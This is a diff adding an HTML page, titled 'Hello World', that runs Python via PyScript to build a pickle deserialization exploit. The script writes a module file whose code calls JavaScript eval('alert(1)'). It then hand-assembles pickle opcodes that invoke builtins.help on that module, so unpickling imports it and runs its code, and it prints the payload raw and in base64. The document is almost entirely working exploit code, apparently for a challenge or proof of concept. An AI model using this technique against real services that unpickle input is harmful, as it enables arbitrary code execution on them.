@@ -1,0 +1,56 @@
+
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width,initial-scale=1" />
+        <link rel="icon" type="image/png" href="favicon.png" />
+        <link
+            rel="stylesheet"
+            href="https://pyscript.net/latest/pyscript.css"
+        />
+        <link rel="stylesheet" href="./assets/css/examples.css" />
+        <script defer src="https://pyscript.net/latest/pyscript.js"></script>
+    </head>
+
+    <body>
+        <nav class="navbar" style="background-color: #000000">
+            <div class="app-header">
+                <a href="/">
+                    <img src="./logo.png" class="logo" />
+                </a>
+                <a class="title" href="" style="color: #f0ab3c">Hello World</a>
+            </div>
+        </nav>
+
+
+            <py-script>
+                import os
+                username = "NgkLmsJJ5791"
+                os.makedirs("profiles", exist_ok=True)
+
+                with open(f'profiles/{username}_exploit.py', 'wb') as f:
+                    f.write(b'II=1\n\nfrom js import eval\neval("alert(1)")')
+
+
+                import pickle, io, builtins
+                import base64
+
+                from pickle import *
+                def create(*args):
+                    return b''.join(args)
+
+                payload = create(
+                    PROTO, b'\x04',
+                    GLOBAL, b"builtins\nhelp\n",
+                    UNICODE, f"profiles.{username}_exploit\n".encode(),
+                    TUPLE1,
+                    REDUCE,
+                    STOP
+                )
+                print(payload)
+                print(base64.b64encode(payload))
+
+            </py-script>
+    </body>
+</html>
